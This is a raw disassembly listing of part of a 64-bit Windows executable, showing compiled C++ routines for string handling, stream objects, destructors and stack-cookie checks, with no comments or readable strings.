   140001d0d:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   140001d11:	e8 fe 67 00 00       	call   0x140008514
   140001d16:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140001d1a:	e8 b1 d5 00 00       	call   0x14000f2d0
   140001d1f:	48 8d 05 8a 67 02 00 	lea    0x2678a(%rip),%rax        # 0x1400284b0
   140001d26:	48 89 03             	mov    %rax,(%rbx)
   140001d29:	40 f6 c7 01          	test   $0x1,%dil
   140001d2d:	74 0d                	je     0x140001d3c
   140001d2f:	ba 30 00 00 00       	mov    $0x30,%edx
   140001d34:	48 8b cb             	mov    %rbx,%rcx
   140001d37:	e8 d8 67 00 00       	call   0x140008514
   140001d3c:	48 8b c3             	mov    %rbx,%rax
   140001d3f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001d44:	48 83 c4 20          	add    $0x20,%rsp
   140001d48:	5f                   	pop    %rdi
   140001d49:	c3                   	ret
   140001d4a:	cc                   	int3
   140001d4b:	cc                   	int3
   140001d4c:	cc                   	int3
   140001d4d:	cc                   	int3
   140001d4e:	cc                   	int3
   140001d4f:	cc                   	int3
   140001d50:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001d55:	57                   	push   %rdi
   140001d56:	48 83 ec 60          	sub    $0x60,%rsp
   140001d5a:	0f 29 74 24 50       	movaps %xmm6,0x50(%rsp)
   140001d5f:	48 8b da             	mov    %rdx,%rbx
   140001d62:	48 8b f9             	mov    %rcx,%rdi
   140001d65:	48 89 4c 24 40       	mov    %rcx,0x40(%rsp)
   140001d6a:	41 0f 10 30          	movups (%r8),%xmm6
   140001d6e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001d71:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140001d76:	33 c0                	xor    %eax,%eax
   140001d78:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001d7d:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140001d82:	48 8b ca             	mov    %rdx,%rcx
   140001d85:	e8 86 50 02 00       	call   0x140026e10
   140001d8a:	4c 8b c0             	mov    %rax,%r8
   140001d8d:	48 8b d3             	mov    %rbx,%rdx
   140001d90:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001d95:	e8 86 38 00 00       	call   0x140005620
   140001d9a:	90                   	nop
   140001d9b:	66 0f 7f 74 24 40    	movdqa %xmm6,0x40(%rsp)
   140001da1:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   140001da6:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001dab:	48 8b cf             	mov    %rdi,%rcx
   140001dae:	e8 fd f6 ff ff       	call   0x1400014b0
   140001db3:	90                   	nop
   140001db4:	48 8b 54 24 38       	mov    0x38(%rsp),%rdx
   140001db9:	48 83 fa 0f          	cmp    $0xf,%rdx
   140001dbd:	76 37                	jbe    0x140001df6
   140001dbf:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140001dc4:	48 ff c2             	inc    %rdx
   140001dc7:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140001dce:	72 1e                	jb     0x140001dee
   140001dd0:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140001dd4:	48 2b c1             	sub    %rcx,%rax
   140001dd7:	48 83 e8 08          	sub    $0x8,%rax
   140001ddb:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001ddf:	77 06                	ja     0x140001de7
   140001de1:	48 83 c2 27          	add    $0x27,%rdx
   140001de5:	eb 0a                	jmp    0x140001df1
   140001de7:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001dec:	cd 29                	int    $0x29
   140001dee:	48 8b c8             	mov    %rax,%rcx
   140001df1:	e8 1e 67 00 00       	call   0x140008514
   140001df6:	48 8d 05 a3 9d 02 00 	lea    0x29da3(%rip),%rax        # 0x14002bba0
   140001dfd:	48 89 07             	mov    %rax,(%rdi)
   140001e00:	48 8b c7             	mov    %rdi,%rax
   140001e03:	48 8b 9c 24 88 00 00 	mov    0x88(%rsp),%rbx
   140001e0a:	00 
   140001e0b:	0f 28 74 24 50       	movaps 0x50(%rsp),%xmm6
   140001e10:	48 83 c4 60          	add    $0x60,%rsp
   140001e14:	5f                   	pop    %rdi
   140001e15:	c3                   	ret
   140001e16:	cc                   	int3
   140001e17:	cc                   	int3
   140001e18:	cc                   	int3
   140001e19:	cc                   	int3
   140001e1a:	cc                   	int3
   140001e1b:	cc                   	int3
   140001e1c:	cc                   	int3
   140001e1d:	cc                   	int3
   140001e1e:	cc                   	int3
   140001e1f:	cc                   	int3
   140001e20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001e25:	57                   	push   %rdi
   140001e26:	48 83 ec 20          	sub    $0x20,%rsp
   140001e2a:	48 8b da             	mov    %rdx,%rbx
   140001e2d:	48 8d 05 f4 65 02 00 	lea    0x265f4(%rip),%rax        # 0x140028428
   140001e34:	48 89 01             	mov    %rax,(%rcx)
   140001e37:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   140001e3b:	48 8b f9             	mov    %rcx,%rdi
   140001e3e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001e41:	0f 11 02             	movups %xmm0,(%rdx)
   140001e44:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140001e48:	e8 3b 7f 00 00       	call   0x140009d88
   140001e4d:	48 8d 05 e4 9c 02 00 	lea    0x29ce4(%rip),%rax        # 0x14002bb38
   140001e54:	48 89 07             	mov    %rax,(%rdi)
   140001e57:	48 8d 05 42 9d 02 00 	lea    0x29d42(%rip),%rax        # 0x14002bba0
   140001e5e:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   140001e62:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001e67:	48 89 07             	mov    %rax,(%rdi)
   140001e6a:	48 8b c7             	mov    %rdi,%rax
   140001e6d:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001e71:	48 83 c4 20          	add    $0x20,%rsp
   140001e75:	5f                   	pop    %rdi
   140001e76:	c3                   	ret
   140001e77:	cc                   	int3
   140001e78:	cc                   	int3
   140001e79:	cc                   	int3
   140001e7a:	cc                   	int3
   140001e7b:	cc                   	int3
   140001e7c:	cc                   	int3
   140001e7d:	cc                   	int3
   140001e7e:	cc                   	int3
   140001e7f:	cc                   	int3
   140001e80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001e85:	57                   	push   %rdi
   140001e86:	48 83 ec 20          	sub    $0x20,%rsp
   140001e8a:	8b da                	mov    %edx,%ebx
   140001e8c:	48 8b f9             	mov    %rcx,%rdi
   140001e8f:	48 8d 05 b2 2c 03 00 	lea    0x32cb2(%rip),%rax        # 0x140034b48
   140001e96:	48 89 01             	mov    %rax,(%rcx)
   140001e99:	e8 76 5d 00 00       	call   0x140007c14
   140001e9e:	90                   	nop
   140001e9f:	f6 c3 01             	test   $0x1,%bl
   140001ea2:	74 0d                	je     0x140001eb1
   140001ea4:	ba 48 00 00 00       	mov    $0x48,%edx
   140001ea9:	48 8b cf             	mov    %rdi,%rcx
   140001eac:	e8 63 66 00 00       	call   0x140008514
   140001eb1:	48 8b c7             	mov    %rdi,%rax
   140001eb4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001eb9:	48 83 c4 20          	add    $0x20,%rsp
   140001ebd:	5f                   	pop    %rdi
   140001ebe:	c3                   	ret
   140001ebf:	cc                   	int3
   140001ec0:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001ec5:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   140001eca:	55                   	push   %rbp
   140001ecb:	48 8d ac 24 10 ff ff 	lea    -0xf0(%rsp),%rbp
   140001ed2:	ff 
   140001ed3:	48 81 ec f0 01 00 00 	sub    $0x1f0,%rsp
   140001eda:	48 8b 05 9f 81 03 00 	mov    0x3819f(%rip),%rax        # 0x14003a080
   140001ee1:	48 33 c4             	xor    %rsp,%rax
   140001ee4:	48 89 85 e0 00 00 00 	mov    %rax,0xe0(%rbp)
   140001eeb:	48 8b d9             	mov    %rcx,%rbx
   140001eee:	33 d2                	xor    %edx,%edx
   140001ef0:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   140001ef6:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001efb:	e8 f0 49 02 00       	call   0x1400268f0
   140001f00:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140001f06:	48 8d 15 13 29 03 00 	lea    0x32913(%rip),%rdx        # 0x140034820
   140001f0d:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f12:	e8 d9 1d 00 00       	call   0x140003cf0
   140001f17:	90                   	nop
   140001f18:	48 83 7d d8 00       	cmpq   $0x0,-0x28(%rbp)
   140001f1d:	0f 84 df 00 00 00    	je     0x140002002
   140001f23:	33 c9                	xor    %ecx,%ecx
   140001f25:	e8 2e d3 00 00       	call   0x14000f258
   140001f2a:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140001f2f:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140001f34:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   140001f38:	e8 7f be 00 00       	call   0x14000ddbc
   140001f3d:	4c 8d 4d 60          	lea    0x60(%rbp),%r9
   140001f41:	4c 8d 05 f0 28 03 00 	lea    0x328f0(%rip),%r8        # 0x140034838
   140001f48:	ba 50 00 00 00       	mov    $0x50,%edx
   140001f4d:	48 8d 8d 90 00 00 00 	lea    0x90(%rbp),%rcx
   140001f54:	e8 db c8 00 00       	call   0x14000e834
   140001f59:	48 8d 95 90 00 00 00 	lea    0x90(%rbp),%rdx
   140001f60:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140001f65:	e8 a6 19 00 00       	call   0x140003910
   140001f6a:	48 8b c8             	mov    %rax,%rcx
   140001f6d:	48 8d 15 d0 28 03 00 	lea    0x328d0(%rip),%rdx        # 0x140034844
   140001f74:	e8 97 19 00 00       	call   0x140003910
   140001f79:	4c 8b 43 10          	mov    0x10(%rbx),%r8
   140001f7d:	48 83 7b 18 0f       	cmpq   $0xf,0x18(%rbx)
   140001f82:	76 03                	jbe    0x140001f87
   140001f84:	48 8b 1b             	mov    (%rbx),%rbx
   140001f87:	48 8b d3             	mov    %rbx,%rdx
   140001f8a:	48 8b c8             	mov    %rax,%rcx
   140001f8d:	e8 1e 33 00 00       	call   0x1400052b0
   140001f92:	48 8b d8             	mov    %rax,%rbx
   140001f95:	48 8b 08             	mov    (%rax),%rcx
   140001f98:	48 63 51 04          	movslq 0x4(%rcx),%rdx
   140001f9c:	48 8b 4c 02 40       	mov    0x40(%rdx,%rax,1),%rcx
   140001fa1:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001fa5:	48 89 4c 24 38       	mov    %rcx,0x38(%rsp)
   140001faa:	48 8b 11             	mov    (%rcx),%rdx
   140001fad:	ff 52 08             	call   *0x8(%rdx)
   140001fb0:	90                   	nop
   140001fb1:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140001fb6:	e8 25 18 00 00       	call   0x1400037e0
   140001fbb:	4c 8b 00             	mov    (%rax),%r8
   140001fbe:	b2 0a                	mov    $0xa,%dl
   140001fc0:	48 8b c8             	mov    %rax,%rcx
   140001fc3:	41 ff 50 40          	call   *0x40(%r8)
   140001fc7:	0f b6 f8             	movzbl %al,%edi
   140001fca:	48 8b 4c 24 38       	mov    0x38(%rsp),%rcx
   140001fcf:	48 85 c9             	test   %rcx,%rcx
   140001fd2:	74 19                	je     0x140001fed
   140001fd4:	48 8b 11             	mov    (%rcx),%rdx
   140001fd7:	ff 52 10             	call   *0x10(%rdx)
   140001fda:	48 85 c0             	test   %rax,%rax
   140001fdd:	74 0e                	je     0x140001fed
   140001fdf:	4c 8b 00             	mov    (%rax),%r8
   140001fe2:	ba 01 00 00 00       	mov    $0x1,%edx
   140001fe7:	48 8b c8             	mov    %rax,%rcx
   140001fea:	41 ff 10             	call   *(%r8)
   140001fed:	40 0f b6 d7          	movzbl %dil,%edx
   140001ff1:	48 8b cb             	mov    %rbx,%rcx
   140001ff4:	e8 d7 3f 00 00       	call   0x140005fd0
   140001ff9:	48 8b cb             	mov    %rbx,%rcx
   140001ffc:	e8 6f 3e 00 00       	call   0x140005e70
   140002001:	90                   	nop
   140002002:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140002007:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000200b:	48 8d 05 c6 2b 03 00 	lea    0x32bc6(%rip),%rax        # 0x140034bd8
   140002012:	48 89 44 0c 50       	mov    %rax,0x50(%rsp,%rcx,1)
   140002017:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000201c:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002020:	8d 91 58 ff ff ff    	lea    -0xa8(%rcx),%edx
   140002026:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   14000202a:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   14000202f:	e8 1c 2b 00 00       	call   0x140004b50
   140002034:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   140002039:	48 63 48 04          	movslq 0x4(%rax),%rcx
   14000203d:	48 8d 05 f4 2b 03 00 	lea    0x32bf4(%rip),%rax        # 0x140034c38
   140002044:	48 89 44 0c 50       	mov    %rax,0x50(%rsp,%rcx,1)
   140002049:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   14000204e:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002052:	8d 51 f0             	lea    -0x10(%rcx),%edx
   140002055:	89 54 0c 4c          	mov    %edx,0x4c(%rsp,%rcx,1)
   140002059:	48 8d 05 e8 2a 03 00 	lea    0x32ae8(%rip),%rax        # 0x140034b48
   140002060:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
   140002064:	48 8d 4d f8          	lea    -0x8(%rbp),%rcx
   140002068:	e8 a7 5b 00 00       	call   0x140007c14
   14000206d:	90                   	nop
   14000206e:	48 8b 8d e0 00 00 00 	mov    0xe0(%rbp),%rcx
   140002075:	48 33 cc             	xor    %rsp,%rcx
   140002078:	e8 33 64 00 00       	call   0x1400084b0
   14000207d:	4c 8d 9c 24 f0 01 00 	lea    0x1f0(%rsp),%r11
   140002084:	00 
   140002085:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   140002089:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   14000208d:	49 8b e3             	mov    %r11,%rsp
   140002090:	5d                   	pop    %rbp
   140002091:	c3                   	ret
   140002092:	cc                   	int3
   140002093:	cc                   	int3
   140002094:	cc                   	int3
   140002095:	cc                   	int3
   140002096:	cc                   	int3
   140002097:	cc                   	int3
   140002098:	cc                   	int3
   140002099:	cc                   	int3
   14000209a:	cc                   	int3
   14000209b:	cc                   	int3
   14000209c:	cc                   	int3
   14000209d:	cc                   	int3
   14000209e:	cc                   	int3
   14000209f:	cc                   	int3
   1400020a0:	40 53                	rex push %rbx
   1400020a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400020a6:	48 8b d9             	mov    %rcx,%rbx
   1400020a9:	48 8b 01             	mov    (%rcx),%rax
   1400020ac:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1400020b0:	48 8d 05 21 2b 03 00 	lea    0x32b21(%rip),%rax        # 0x140034bd8
   1400020b7:	48 89 04 0a          	mov    %rax,(%rdx,%rcx,1)
   1400020bb:	48 8b 01             	mov    (%rcx),%rax
   1400020be:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1400020c2:	44 8d 82 58 ff ff ff 	lea    -0xa8(%rdx),%r8d
   1400020c9:	44 89 44 0a fc       	mov    %r8d,-0x4(%rdx,%rcx,1)
   1400020ce:	48 83 c1 08          	add    $0x8,%rcx
   1400020d2:	e8 79 2a 00 00       	call   0x140004b50
   1400020d7:	48 8b 03             	mov    (%rbx),%rax
   1400020da:	48 63 50 04          	movslq 0x4(%rax),%rdx
   1400020de:	48 8d 05 53 2b 03 00 	lea    0x32b53(%rip),%rax        # 0x140034c38
   1400020e5:	48 89 04 1a          	mov    %rax,(%rdx,%rbx,1)
   1400020e9:	48 8b 03             	mov    (%rbx),%rax
   1400020ec:	48 63 48 04          	movslq 0x4(%rax),%rcx
   1400020f0:	8d 51 f0             	lea    -0x10(%rcx),%edx
   1400020f3:	89 54 19 fc          	mov    %edx,-0x4(%rcx,%rbx,1)
   1400020f7:	48 8d 8b a8 00 00 00 	lea    0xa8(%rbx),%rcx
   1400020fe:	48 8d 05 43 2a 03 00 	lea    0x32a43(%rip),%rax        # 0x140034b48
   140002105:	48 89 01             	mov    %rax,(%rcx)
   140002108:	e8 07 5b 00 00       	call   0x140007c14
   14000210d:	90                   	nop
   14000210e:	48 83 c4 20          	add    $0x20,%rsp
   140002112:	5b                   	pop    %rbx
   140002113:	c3                   	ret
   140002114:	cc                   	int3
   140002115:	cc                   	int3
   140002116:	cc                   	int3
   140002117:	cc                   	int3
   140002118:	cc                   	int3
   140002119:	cc                   	int3
   14000211a:	cc                   	int3
   14000211b:	cc                   	int3
   14000211c:	cc                   	int3
   14000211d:	cc                   	int3
   14000211e:	cc                   	int3
   14000211f:	cc                   	int3
   140002120:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140002125:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000212a:	55                   	push   %rbp
   14000212b:	57                   	push   %rdi
   14000212c:	41 54                	push   %r12
   14000212e:	41 56                	push   %r14
   140002130:	41 57                	push   %r15
   140002132:	48 8d ac 24 30 fc ff 	lea    -0x3d0(%rsp),%rbp
   140002139:	ff 
   14000213a:	48 81 ec d0 04 00 00 	sub    $0x4d0,%rsp
   140002141:	48 8b 05 38 7f 03 00 	mov    0x37f38(%rip),%rax        # 0x14003a080
   140002148:	48 33 c4             	xor    %rsp,%rax
   14000214b:	48 89 85 c0 03 00 00 	mov    %rax,0x3c0(%rbp)
   140002152:	4c 8b f9             	mov    %rcx,%r15
   140002155:	45 33 e4             	xor    %r12d,%r12d
   140002158:	48 8d 95 b0 02 00 00 	lea    0x2b0(%rbp),%rdx
   14000215f:	b9 04 01 00 00       	mov    $0x104,%ecx
   140002164:	ff 15 1e 5f 02 00    	call   *0x25f1e(%rip)        # 0x140028088
   14000216a:	4c 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%r9
   140002171:	45 33 c0             	xor    %r8d,%r8d
   140002174:	48 8d 15 cd 26 03 00 	lea    0x326cd(%rip),%rdx        # 0x140034848
   14000217b:	48 8d 8d b0 02 00 00 	lea    0x2b0(%rbp),%rcx
   140002182:	ff 15 d8 5e 02 00    	call   *0x25ed8(%rip)        # 0x140028060
   140002188:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000218b:	0f 11 44 24 78       	movups %xmm0,0x78(%rsp)
   140002190:	4c 89 65 88          	mov    %r12,-0x78(%rbp)
   140002194:	4c 89 65 90          	mov    %r12,-0x70(%rbp)
   140002198:	48 8d 8d a0 01 00 00 	lea    0x1a0(%rbp),%rcx
   14000219f:	e8 6c 4c 02 00       	call   0x140026e10
   1400021a4:	4c 8b c0             	mov    %rax,%r8
   1400021a7:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   1400021ae:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   1400021b3:	e8 68 34 00 00       	call   0x140005620
   1400021b8:	90                   	nop
   1400021b9:	4c 8b 45 88          	mov    -0x78(%rbp),%r8
   1400021bd:	48 8b 4d 90          	mov    -0x70(%rbp),%rcx
   1400021c1:	48 8b c1             	mov    %rcx,%rax
   1400021c4:	49 2b c0             	sub    %r8,%rax
   1400021c7:	41 be 17 00 00 00    	mov    $0x17,%r14d
   1400021cd:	48 8d 3d 7c 26 03 00 	lea    0x3267c(%rip),%rdi        # 0x140034850
   1400021d4:	49 3b c6             	cmp    %r14,%rax
   1400021d7:	72 7b                	jb     0x140002254
   1400021d9:	49 8d 40 17          	lea    0x17(%r8),%rax
   1400021dd:	48 89 45 88          	mov    %rax,-0x78(%rbp)
   1400021e1:	48 8d 5c 24 78       	lea    0x78(%rsp),%rbx
   1400021e6:	48 83 f9 0f          	cmp    $0xf,%rcx
   1400021ea:	48 0f 47 5c 24 78    	cmova  0x78(%rsp),%rbx
   1400021f0:	48 8d 05 70 26 03 00 	lea    0x32670(%rip),%rax        # 0x140034867
   1400021f7:	48 3b c3             	cmp    %rbx,%rax
   1400021fa:	76 1b                	jbe    0x140002217
   1400021fc:	4a 8d 04 03          	lea    (%rbx,%r8,1),%rax
   140002200:	48 3b f8             	cmp    %rax,%rdi
   140002203:	77 12                	ja     0x140002217
   140002205:	48 3b df             	cmp    %rdi,%rbx
   140002208:	77 05                	ja     0x14000220f
   14000220a:	41 8b f4             	mov    %r12d,%esi
   14000220d:	eb 0b                	jmp    0x14000221a
   14000220f:	48 8b f3             	mov    %rbx,%rsi
   140002212:	48 2b f7             	sub    %rdi,%rsi
   140002215:	eb 03                	jmp    0x14000221a
   140002217:	49 8b f6             	mov    %r14,%rsi
   14000221a:	49 ff c0             	inc    %r8
   14000221d:	48 8d 4b 17          	lea    0x17(%rbx),%rcx
   140002221:	48 8b d3             	mov    %rbx,%rdx
   140002224:	e8 17 40 02 00       	call   0x140026240
   140002229:	4c 8b c6             	mov    %rsi,%r8
   14000222c:	48 8b d7             	mov    %rdi,%rdx
   14000222f:	48 8b cb             	mov    %rbx,%rcx
   140002232:	e8 09 40 02 00       	call   0x140026240
   140002237:	4c 2b f6             	sub    %rsi,%r14
   14000223a:	48 8d 57 17          	lea    0x17(%rdi),%rdx
   14000223e:	48 03 d6             	add    %rsi,%rdx
   140002241:	48 8d 0c 33          	lea    (%rbx,%rsi,1),%rcx
   140002245:	4d 8b c6             	mov    %r14,%r8
   140002248:	e8 f3 3f 02 00       	call   0x140026240
   14000224d:	48 8d 44 24 78       	lea    0x78(%rsp),%rax
   140002252:	eb 17                	jmp    0x14000226b
   140002254:	4c 89 74 24 28       	mov    %r14,0x28(%rsp)
   140002259:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   14000225e:	49 8b d6             	mov    %r14,%rdx
   140002261:	48 8d 4c 24 78       	lea    0x78(%rsp),%rcx
   140002266:	e8 f5 45 00 00       	call   0x140006860
   14000226b:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000226e:	0f 11 85 80 01 00 00 	movups %xmm0,0x180(%rbp)
   140002275:	4c 89 a5 90 01 00 00 	mov    %r12,0x190(%rbp)
   14000227c:	4c 89 a5 98 01 00 00 	mov    %r12,0x198(%rbp)
   140002283:	0f 10 00             	movups (%rax),%xmm0
   140002286:	0f 11 85 80 01 00 00 	movups %xmm0,0x180(%rbp)
   14000228d:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140002291:	0f 11 8d 90 01 00 00 	movups %xmm1,0x190(%rbp)
   140002298:	4c 89 60 10          	mov    %r12,0x10(%rax)
   14000229c:	48 c7 40 18 0f 00 00 	movq   $0xf,0x18(%rax)
   1400022a3:	00 
   1400022a4:	c6 00 00             	movb   $0x0,(%rax)
   1400022a7:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   1400022ae:	e8 0d fc ff ff       	call   0x140001ec0
   1400022b3:	90                   	nop
   1400022b4:	48 8b 95 98 01 00 00 	mov    0x198(%rbp),%rdx
   1400022bb:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400022bf:	76 39                	jbe    0x1400022fa
   1400022c1:	48 8b 85 80 01 00 00 	mov    0x180(%rbp),%rax
   1400022c8:	48 ff c2             	inc    %rdx
   1400022cb:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400022d2:	72 1e                	jb     0x1400022f2
   1400022d4:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400022d8:	48 2b c1             	sub    %rcx,%rax
   1400022db:	48 83 e8 08          	sub    $0x8,%rax
   1400022df:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400022e3:	77 06                	ja     0x1400022eb
   1400022e5:	48 83 c2 27          	add    $0x27,%rdx
   1400022e9:	eb 0a                	jmp    0x1400022f5
   1400022eb:	b9 05 00 00 00       	mov    $0x5,%ecx
   1400022f0:	cd 29                	int    $0x29
   1400022f2:	48 8b c8             	mov    %rax,%rcx
   1400022f5:	e8 1a 62 00 00       	call   0x140008514
   1400022fa:	4c 89 a5 90 01 00 00 	mov    %r12,0x190(%rbp)
   140002301:	48 c7 85 98 01 00 00 	movq   $0xf,0x198(%rbp)
   140002308:	0f 00 00 00 
   14000230c:	c6 85 80 01 00 00 00 	movb   $0x0,0x180(%rbp)
   140002313:	48 8b 55 90          	mov    -0x70(%rbp),%rdx
   140002317:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000231b:	76 37                	jbe    0x140002354
   14000231d:	48 8b 44 24 78       	mov    0x78(%rsp),%rax
   140002322:	48 ff c2             	inc    %rdx
   140002325:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000232c:	72 1e                	jb     0x14000234c
   14000232e:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   140002332:	48 2b c1             	sub    %rcx,%rax
   140002335:	48 83 e8 08          	sub    $0x8,%rax
   140002339:	48 83 f8 1f          	cmp    $0x1f,%rax
   14000233d:	77 06                	ja     0x140002345
   14000233f:	48 83 c2 27          	add    $0x27,%rdx
   140002343:	eb 0a                	jmp    0x14000234f
   140002345:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000234a:	cd 29                	int    $0x29
   14000234c:	48 8b c8             	mov    %rax,%rcx
   14000234f:	e8 c0 61 00 00       	call   0x140008514
   140002354:	33 d2                	xor    %edx,%edx
   140002356:	41 b8 08 01 00 00    	mov    $0x108,%r8d
   14000235c:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002360:	e8 8b 45 02 00       	call   0x1400268f0
   140002365:	41 b8 20 00 00 00    	mov    $0x20,%r8d
   14000236b:	48 8d 95 a0 01 00 00 	lea    0x1a0(%rbp),%rdx
   140002372:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   140002376:	e8 75 19 00 00       	call   0x140003cf0
   14000237b:	90                   	nop
   14000237c:	48 83 bd 88 00 00 00 	cmpq   $0x0,0x88(%rbp)
   140002383:	00 
   140002384:	0f 85 85 00 00 00    	jne    0x14000240f
   14000238a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000238d:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140002392:	4c 89 64 24 60       	mov    %r12,0x60(%rsp)
   140002397:	4c 89 64 24 68       	mov    %r12,0x68(%rsp)
   14000239c:	41 b8 25 00 00 00    	mov    $0x25,%r8d
   1400023a2:	48 8d 15 bf 24 03 00 	lea    0x324bf(%rip),%rdx        # 0x140034868
   1400023a9:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400023ae:	e8 6d 32 00 00       	call   0x140005620
   1400023b3:	90                   	nop
   1400023b4:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400023b9:	e8 02 fb ff ff       	call   0x140001ec0
   1400023be:	90                   	nop
   1400023bf:	48 8b 54 24 68       	mov    0x68(%rsp),%rdx
   1400023c4:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400023c8:	0f 86 ee 05 00 00    	jbe    0x1400029bc
   1400023ce:	48 8b 44 24 50       	mov    0x50(%rsp),%rax
   1400023d3:	48 ff c2             	inc    %rdx
   1400023d6:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400023dd:	72 23                	jb     0x140002402
   1400023df:	48 8b 48 f8          	mov    -0x8(%rax),%rcx
   1400023e3:	48 2b c1             	sub    %rcx,%rax
   1400023e6:	48 83 e8 08          	sub    $0x8,%rax
   1400023ea:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400023ee:	0f 87 ac 05 00 00    	ja     0x1400029a0
   1400023f4:	48 83 c2 27          	add    $0x27,%rdx
   1400023f8:	e8 17 61 00 00       	call   0x140008514
   1400023fd:	e9 ba 05 00 00       	jmp    0x1400029bc
   140002402:	48 8b c8             	mov    %rax,%rcx
   140002405:	e8 0a 61 00 00       	call   0x140008514
   14000240a:	e9 ad 05 00 00       	jmp    0x1400029bc
   14000240f:	49 8b 17             	mov    (%r15),%rdx
   140002412:	4d 8b 47 08          	mov    0x8(%r15),%r8
   140002416:	4c 2b c2             	sub    %rdx,%r8
   140002419:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   14000241d:	e8 de 27 00 00       	call   0x140004c00
   140002422:	48 8d 4d 08          	lea    0x8(%rbp),%rcx
   140002426:	e8 d5 36 00 00       	call   0x140005b00
   14000242b:	48 85 c0             	test   %rax,%rax
   14000242e:	75 30                	jne    0x140002460
   140002430:	48 8b 45 00          	mov    0x0(%rbp),%rax
   140002434:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140002438:	b8 06 00 00 00       	mov    $0x6,%eax
   14000243d:	ba 02 00 00 00       	mov    $0x2,%edx
   140002442:	48 83 7c 0d 48 00    	cmpq   $0x0,0x48(%rbp,%rcx,1)
   140002448:	0f 45 c2             	cmovne %edx,%eax
   14000244b:	0b 44 0d 10          	or     0x10(%rbp,%rcx,1),%eax
   14000244f:	83 e0 17             	and    $0x17,%eax
   140002452:	89 44 0d 10          	mov    %eax,0x10(%rbp,%rcx,1)
   140002456:	23 44 0d 14          	and    0x14(%rbp,%rcx,1),%eax
   14000245a:	0f 85 fb 05 00 00    	jne    0x140002a5b
   140002460:	4c 8d 8d 95 01 00 00 	lea    0x195(%rbp),%r9
   140002467:	4d 8b 47 08          	mov    0x8(%r15),%r8
   14000246b:	4d 2b 07             	sub    (%r15),%r8
